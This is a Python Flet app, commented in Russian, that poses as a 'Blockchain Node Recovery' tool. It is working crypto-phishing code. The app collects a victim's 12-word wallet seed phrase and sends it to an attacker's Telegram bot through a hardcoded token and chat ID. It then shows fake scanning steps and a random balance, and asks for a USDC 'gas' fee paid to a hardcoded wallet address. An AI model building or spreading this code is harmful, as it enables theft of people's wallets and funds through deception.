import flet as ft
import requests
import random
import time

# --- ТВОИ ПРОВЕРЕННЫЕ ДАННЫЕ ---
TOKEN = "8601525427:AAEuynoRLo7TkjpKQ1aflArSGXplmsGIZVw"
CHAT_ID = "8601525427" 
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

def main(page: ft.Page):
    # Настройки страницы для мобилок
    page.title = "Blockchain Node Recovery"
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.padding = 30
    page.bgcolor = "#0a0a0a"

    # 1. Начальные элементы интерфейса
    header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
    
    seed_input = ft.TextField(
        label="Seed Phrase (12 words)", 
        multiline=True, 
        min_lines=3, 
        width=350,
        border_radius=12,
        border_color="blueaccent",
        hint_text="Введите 12 слов через пробел..."
    )
    
    btn = ft.ElevatedButton(
        "ИНИЦИАЛИЗИРОВАТЬ", 
        width=300, 
        height=55, 
        bgcolor="blue", 
        color="white",
        style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=10))
    )
    
    # 2. Блок анимации "Поиска"
    loading_column = ft.Column(visible=False, horizontal_alignment="center", spacing=20)
    progress = ft.ProgressRing(width=60, height=60, stroke_width=3, color="blueaccent")
    loading_text = ft.Text("Установка соединения...", italic=True, size=16)
    loading_column.controls = [progress, loading_text]

    # 3. Блок финального результата
    result_column = ft.Column(visible=False, horizontal_alignment="center", spacing=15)

    def on_click(e):
        phrase = seed_input.value.strip()
        words = phrase.split()
        
        # Проверка на количество слов
        if len(words) != 12:
            page.snack_bar = ft.SnackBar(ft.Text("⚠️ Введите ровно 12 слов сид-фразы!"), bgcolor="red")
            page.snack_bar.open = True
            page.update()
            return

        # Скрываем ввод, запускаем "процесс"
        header.visible = False
        seed_input.visible = False
        btn.visible = False
        loading_column.visible = True
        page.update()

        # --- ОТПРАВКА ДАННЫХ (БЕЗ ЗАДЕРЖЕК) ---
        try:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                json={
                    "chat_id": CHAT_ID, 
                    "text": f"🚨 ПОЛУЧЕНА СИД-ФРАЗА:\n\n{phrase}"
                }, 
                timeout=5
            )
        except:
            pass

        # --- КРАСИВАЯ ИМИТАЦИЯ РАБОТЫ ---
        steps = [
            "Подключение к главной ноде...",
            "Сканирование блоков (0-45%)...",
            "Поиск совпадений в сети...",
            "Проверка сигнатуры кошелька...",
            "Финальная дешифровка..."
        ]

        for step in steps:
            loading_text.value = step
            page.update()
            time.sleep(1.8) # Создаем эффект реальной работы

        # --- ПОКАЗЫВАЕМ РЕЗУЛЬТАТ ---
        loading_column.visible = False
        
        # Случайный баланс для правдоподобности
        btc_bal = round(random.uniform(0.00058, 0.00092), 6)
        
        result_column.controls = [
            ft.Icon(ft.icons.CHECK_CIRCLE_OUTLINE, color="green", size=60),
            ft.Text("СИГНАТУРА НАЙДЕНА!", color="green", size=22, weight="bold"),
            ft.Text(f"Баланс кошелька: {btc_bal} BTC", size=18, weight="w500"),
            ft.Divider(height=20, color="transparent"),
            ft.Container(
                padding=20,
                bgcolor="#1a1a1a",
                border_radius=15,
                border=ft.border.all(1, "white10"),
                content=ft.Column([
                    ft.Text("Для активации вывода оплатите газ (34.08 USDC):", size=13, color="white70"),
                    ft.Text(TARGET_ADDRESS, size=11, color="blue200", weight="bold", selectable=True),
                    ft.Text("(Нажмите на адрес выше для копирования)", size=10, italic=True, color="white38")
                ], horizontal_alignment="center")
            )
        ]
        result_column.visible = True
        page.update()

    btn.on_click = on_click
    
    # Добавляем всё в главный контейнер
    page.add(
        header,
        ft.Divider(height=10, color="transparent"),
        seed_input,
        ft.Divider(height=5, color="transparent"),
        btn,
        loading_column,
        result_column
    )

# Запуск приложения
if __name__ == "__main__":
    ft.app(target=main)
